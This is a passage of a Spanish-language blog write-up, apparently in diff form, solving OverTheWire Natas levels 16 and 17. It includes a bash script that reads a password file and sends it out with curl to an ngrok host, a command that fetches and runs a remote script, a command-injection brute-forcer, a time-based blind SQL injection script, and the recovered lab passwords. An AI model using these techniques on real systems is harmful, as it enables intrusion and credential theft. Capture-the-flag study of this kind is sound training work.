+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+archivo<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/etc/natas_webpass/natas17&#34;</span>
+contenido<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat <span style="color:#e6db74">&#34;</span>$archivo<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span>
+servidor<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://test.ngrok-free.app/&#34;</span>
+respuesta<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl <span style="color:#e6db74">&#34;</span>$servidor$contenido<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span></code></pre></div>
+<p><img src="/posts/images/natas/natas16.2.png" alt="Natas16"></p>
+<p>Solo tendría que ejecutar <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">$(</span>curl https://test.ngrok-free.app/script.sh<span style="color:#66d9ef">)</span></code></pre></div> en el servidor víctima y este a su vez ejecutará un curl
+a mi sistema a una dirreción que sería la flag, todo muy bonito, pero estas máquinas no tienen conexión con el exterior por tanto
+nada de esto sirve realmente para nada en este escenario, pero en muchos entornos funcionaría perfectamente. En este caso tendremos que sacar la flag de una forma parecida al nivel anterior.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">$(</span>grep passpow /etc/natas_webpass/natas17<span style="color:#66d9ef">)</span>bypass</code></pre></div>
+<p>En este caso si la cadena <strong>&ldquo;passpow&rdquo;</strong> no está en la flag no devuelve nada y por tanto únicamente se busca <strong>bypass</strong> y claro
+como la palabra está en el diccionario nos aparece, por tanto si no nos aparece nada es porque la string buscada está en la flag
+y se estaría buscando por ejemplo <strong>&ldquo;1bypass&rdquo;</strong>. Debemos poner los caracteres en su correspondiente lugar de la string. Lo haremos de la siguiente manera.</p>
+<p><img src="/posts/images/natas/natas16.3.png" alt="Natas16"></p>
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">$(</span>grep ^8 /etc/natas_webpass/natas17<span style="color:#66d9ef">)</span>bypass</code></pre></div>
+^a indica en bash que empieza por a.
+Ahora solo falta automatizarlo con un script en python };)</p>
+<p><img src="/posts/images/natas/natas16.4.png" alt="Natas16"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+
+headers <span style="color:#f92672">=</span> {
+    <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#39;</span>,
+    <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;es-ES,es;q=0.6&#39;</span>,
+    <span style="color:#e6db74">&#39;Authorization&#39;</span>: <span style="color:#e6db74">&#39;Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==&#39;</span>,
+    <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;keep-alive&#39;</span>,
+    <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://natas16.natas.labs.overthewire.org/?needle=</span><span style="color:#e6db74">%24%</span><span style="color:#e6db74">28grep+</span><span style="color:#e6db74">%5E</span><span style="color:#e6db74">8+</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">etc</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">natas_webpass</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">natas17%29bypass&amp;submit=Search&#39;</span>,
+    <span style="color:#e6db74">&#39;Sec-GPC&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>,
+    <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>,
+    <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;farlopa&#39;</span>,
+}
+
+
+password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits: 
+        params <span style="color:#f92672">=</span> {
+                <span style="color:#e6db74">&#39;needle&#39;</span>: <span style="color:#e6db74">&#39;$(grep ^</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> /etc/natas_webpass/natas17)bypass&#39;</span><span style="color:#f92672">.</span>format(password<span style="color:#f92672">+</span>i),
+            <span style="color:#e6db74">&#39;submit&#39;</span>: <span style="color:#e6db74">&#39;Search&#39;</span>,
+
+        }
+
+        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://natas16.natas.labs.overthewire.org/&#39;</span>, params<span style="color:#f92672">=</span>params, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;bypass&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
+            password<span style="color:#f92672">+=</span>i
+            print(password)
+            </code></pre></div>
+<p><strong>natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd</strong></p>
+<h2 id="natas17">Natas17</h2>
+<p>Ponemos la siguiente instrucción, y vemos que el servidor tarda unos segundos en responder la query.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="color:#e6db74">&#34; UNION SELECT SLEEP(10), null # </span></code></pre></div>
+<p>Bueno parece que tenía razón :) nos vendría bien el script de Natas15, estamos ante una SQLI Blind! Prácticamente copypasteando
+el código de antes consigo la clave.</p>
+<p><img src="/posts/images/natas/natas17.png" alt="Natas17"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+
+
+headers <span style="color:#f92672">=</span> {
+    <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#39;</span>,
+    <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;es-ES,es;q=0.5&#39;</span>,
+    <span style="color:#e6db74">&#39;Authorization&#39;</span>: <span style="color:#e6db74">&#39;Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA==&#39;</span>,
+    <span style="color:#e6db74">&#39;Cache-Control&#39;</span>: <span style="color:#e6db74">&#39;max-age=0&#39;</span>,
+    <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;keep-alive&#39;</span>,
+    <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
+    <span style="color:#e6db74">&#39;Origin&#39;</span>: <span style="color:#e6db74">&#39;http://natas17.natas.labs.overthewire.org&#39;</span>,
+    <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://natas17.natas.labs.overthewire.org/&#39;</span>,
+    <span style="color:#e6db74">&#39;Sec-GPC&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>,
+    <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>,
+    <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;passpow&#39;</span>,
+}
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sqlitime</span>(letter, number):
+    data <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;&#34; union select if((select mid(password,</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">,1) from users where username=&#34;natas18&#34; limit 0,1) like binary </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">, SLEEP(10),1), null from users -- -&#39;</span><span style="color:#f92672">.</span>format(number, letter),
+    }
+    <span style="color:#66d9ef">try</span>:
+        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://natas17.natas.labs.overthewire.org/index.php&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>data, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+
+n<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+total<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits:
+       
+        <span style="color:#66d9ef">if</span> sqlitime(i, n):
+            total<span style="color:#f92672">+=</span>i
+            print(total)
+            n<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+            <span style="color:#66d9ef">break</span></code></pre></div>
+<p><strong>natas18:8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq</strong></p>
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+        <span>passpow</span>
+    
+</footer>
+    </div>
+
+</body>
+
+</html>
